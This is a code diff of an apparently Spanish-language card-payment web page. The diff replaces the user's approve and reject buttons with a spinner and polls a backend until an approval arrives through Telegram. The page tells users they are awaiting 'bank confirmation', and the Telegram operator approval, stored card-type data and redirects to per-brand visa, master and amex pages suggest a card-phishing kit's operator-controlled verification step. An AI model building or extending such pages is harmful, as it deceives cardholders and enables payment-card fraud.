@@ -192,12 +192,12 @@ button {
 
   <div class="bank-info">
     <strong>✓ Esperando confirmación de banco</strong><br>
-    Se ha enviado una solicitud de autorización. Por favor espera mientras se procesa.
+    Se ha enviado una solicitud de autorización a Telegram. Por favor aprueba o rechaza desde la aplicación.
   </div>
 
-  <div class="button-group">
-    <button class="btn-cancel" onclick="rechazarAutorizacion()">❌ RECHAZAR</button>
-    <button class="btn-confirm" onclick="aprobarAutorizacion()">✅ APROBAR</button>
+  <div style="text-align: center; margin-top: 30px; padding: 20px;">
+    <div style="display: inline-block; width: 50px; height: 50px; border: 5px solid #ddd; border-top-color: #667eea; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+    <p style="margin-top: 20px; color: #888; font-size: 14px;">Esperando confirmación...</p>
   </div>
 </div>
 
@@ -224,57 +224,14 @@ document.getElementById("cardBrandLogo").src = tipoTarjeta === "visa" ? "/visa.p
 var WEBHOOK_BASE_URL = window.location.hostname === 'localhost' ? 'http://localhost:3000' : 'https://snr-payment-backend.onrender.com';
 var pollingInterval = null;
 
-function mostrarLoading(mostrar) {
-  document.getElementById("mockOverlay").style.display = mostrar ? "block" : "none";
-  document.getElementById("modalLoading").style.display = mostrar ? "block" : "none";
-}
-
-function aprobarAutorizacion() {
-  var btn = event.target;
-  btn.disabled = true;
-  mostrarLoading(true);
-
-  fetch(WEBHOOK_BASE_URL + '/api/send-telegram', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      mensaje: "✅ PAGO APROBADO\n\n" + datosTransaccion.solicitudId,
-      inline_keyboard: null
-    })
-  }).then(() => {
-    iniciarPollingAprobacion();
-  });
-}
-
-function rechazarAutorizacion() {
-  if (!confirm("¿Rechazar esta transacción?")) return;
-
-  var btn = event.target;
-  btn.disabled = true;
-  mostrarLoading(true);
-
-  fetch(WEBHOOK_BASE_URL + '/api/send-telegram', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      mensaje: "❌ PAGO RECHAZADO\n\n" + datosTransaccion.solicitudId,
-      inline_keyboard: null
-    })
-  }).then(() => {
-    setTimeout(() => {
-      alert("Transacción rechazada");
-      window.location.href = "index.html";
-    }, 1000);
-  });
-}
-
+// Iniciar polling para esperar confirmación de Telegram
 function iniciarPollingAprobacion() {
   var tiempoInicio = Date.now();
   pollingInterval = setInterval(function () {
-    if (Date.now() - tiempoInicio > 60000) {
+    if (Date.now() - tiempoInicio > 300000) {
       clearInterval(pollingInterval);
-      mostrarLoading(false);
-      alert("Tiempo de espera agotado");
+      alert("Tiempo de espera agotado. Transacción cancelada.");
+      window.location.href = "index.html";
       return;
     }
 
@@ -283,18 +240,24 @@ function iniciarPollingAprobacion() {
       .then(data => {
         if (data.estado === 'approved') {
           clearInterval(pollingInterval);
-          mostrarLoading(false);
 
           var map = { 'visa': 'visa.html', 'mastercard': 'master.html', 'amex': 'amex.html' };
           var destino = map[datosTransaccion.tipoTarjeta] || 'index.html';
 
           localStorage.removeItem("snr_transaccion_actual");
           window.location.href = destino;
+        } else if (data.estado === 'rejected') {
+          clearInterval(pollingInterval);
+          alert("Transacción rechazada.");
+          window.location.href = "index.html";
         }
       })
       .catch(e => console.error('Error polling:', e));
   }, 2000);
 }
+
+// Iniciar polling cuando carga la página
+iniciarPollingAprobacion();
 </script>
 
 </body>
